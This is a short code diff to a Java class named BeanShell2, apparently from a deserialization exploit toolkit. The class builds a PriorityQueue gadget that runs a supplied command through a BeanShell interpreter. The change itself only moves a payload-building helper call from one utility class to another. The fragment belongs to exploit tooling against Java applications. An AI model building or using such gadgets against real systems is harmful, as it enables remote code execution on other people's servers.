@@ -4,7 +4,7 @@ import bsh.Interpreter;
 import bsh.NameSpace;
 import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
-import com.qi4l.JYso.gadgets.utils.beanshell.BeanShellUtil;
+
 
 import java.lang.reflect.*;
 import java.util.Comparator;
@@ -20,7 +20,7 @@ import java.util.PriorityQueue;
 public class BeanShell2 implements ObjectPayload<PriorityQueue> {
 
     public PriorityQueue getObject(String command) throws Exception {
-        String payload = BeanShellUtil.makeBeanShellPayload(command);
+        String payload = com.qi4l.JYso.gadgets.utils.Utils.makeBeanShellPayload(command);
         Interpreter i = new Interpreter();
 
         Method setu = i.getClass().getDeclaredMethod("setu", String.class, Object.class);
